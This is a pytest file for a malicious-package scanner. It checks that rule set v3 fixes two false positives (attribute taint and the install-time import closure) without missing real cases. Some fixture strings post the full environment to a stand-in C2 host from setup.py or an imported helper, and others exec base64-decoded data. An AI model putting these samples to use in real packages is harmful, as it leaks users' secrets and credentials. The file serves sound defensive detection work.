"""Rule set v3: the two false-positive root causes found on real packages, and what must NOT regress.

Both fixes are gated behind rules_version >= 3, so v1/v2 stay frozen (tests/test_corpus_and_freeze.py).
"""

from __future__ import annotations

from tests.conftest import rule_ids

HEAD = "from setuptools import setup\n"


# ------------------------------------------------------------------ taint: attributes do not taint `self`
POISON = '''
import base64, subprocess


class Worker:
    def __init__(self, blob):
        self.data = base64.b64decode(blob)      # a decode assigned to an ATTRIBUTE

    def launch(self):
        subprocess.Popen([self.cmd, "--status-file", self.path])    # nothing here is decoded
'''


def test_attribute_assignment_no_longer_taints_the_whole_object(scan):
    assert "PY-EXEC-DECODED" in rule_ids(scan({"pkg/w.py": POISON}, rules=2))    # the documented false positive
    assert "PY-EXEC-DECODED" not in rule_ids(scan({"pkg/w.py": POISON}, rules=3))


def test_attribute_held_payload_is_still_caught_in_v3(scan):
    code = '''
import base64


class Loader:
    def __init__(self):
        self.p = base64.b64decode("cHJpbnQoMSk=")

    def go(self):
        exec(self.p)
'''
    assert "PY-EXEC-DECODED" in rule_ids(scan({"pkg/l.py": code}, rules=3))


def test_tuple_unpacking_and_plain_names_still_propagate_taint_in_v3(scan):
    code = 'import base64\nimport os\n\ndef f(x):\n    a, b = base64.b64decode(x), 1\n    os.system(a)\n'
    assert "PY-EXEC-DECODED" in rule_ids(scan({"pkg/m.py": code}, rules=3))


# ---------------------------------------- install closure: only module-level code of imported files is install-time
HELPER_FN = '''
import os, urllib.request


def collect():
    urllib.request.urlopen("http://c2.example/", data=str(dict(os.environ)).encode())
'''


def test_function_in_an_imported_module_is_not_install_time_unless_called(scan):
    files = {"setup.py": HEAD + "import helper\nsetup(name='x')\n", "helper.py": HELPER_FN}
    v2 = scan(files, rules=2)
    v3 = scan(files, rules=3)
    assert next(f for f in v2.findings if f.rule_id == "PY-EXFIL").phase == "install"    # over-approximation
    assert all(f.phase != "install" for f in v3.findings if f.rule_id == "PY-EXFIL")
    assert v3.verdict == "benign"


def test_called_at_module_level_in_the_imported_module_is_install_time_in_v3(scan):
    files = {"setup.py": HEAD + "import helper\nsetup(name='x')\n", "helper.py": HELPER_FN + "\ncollect()\n"}
    f = next(f for f in scan(files, rules=3).findings if f.rule_id == "PY-EXFIL")
    assert f.phase == "install"
    assert scan(files, rules=3).verdict != "benign"


def test_setup_py_itself_remains_fully_install_time_in_v3(scan):
    body = "import os, urllib.request\ndef beacon():\n    urllib.request.urlopen('http://c2.example', str(dict(os.environ)).encode())\n"
    files = {"setup.py": HEAD + body + "setup(name='x')\n"}     # function never called, but it is setup.py
    assert next(f for f in scan(files, rules=3).findings if f.rule_id == "PY-EXFIL").phase == "install"


def test_entry_files_are_recorded_before_the_closure_widens_install_files(scan):
    from mpd.analyzers.base import ScanContext
    from mpd.analyzers import install_hooks
    from tests.conftest import make_pkg
    ctx = ScanContext(pkg=make_pkg({"setup.py": HEAD + "import helper\nsetup(name='x')\n", "helper.py": "x = 1\n"}), rules_version=3)
    install_hooks.run(ctx)
    assert ctx.install_entry == {"setup.py"} and "helper.py" in ctx.install_files
